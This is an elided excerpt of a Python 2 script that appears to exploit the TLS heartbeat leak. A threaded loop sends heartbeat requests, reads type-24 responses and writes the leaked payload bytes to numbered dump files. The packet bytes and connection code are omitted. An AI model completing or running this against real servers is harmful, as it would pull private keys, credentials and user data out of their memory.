...
def hit_hb(s, filenum):
    while True:
        ...
        if typ == 24:
            ...
            if len(pay) > 3:
                with open("./dump/dump_%s.bin" % filenum, "a") as f:
                    f.write(pay)
                    f.close()
                    print "%s bytes written to./dump/dump_%s.bin" % (len(pay),filenum)
...
class ThreadClass(threading.Thread):
    def run(self):
        ...
        while True:
            ...
            i = 0
            while os.path.exists("./dump/dump_%s.bin" % i):
			    i += 1;

            open("./dump/dump_%s.bin" % i, 'w').close()
            s.send(hb)
            while hit_hb(s, i):
                continue;
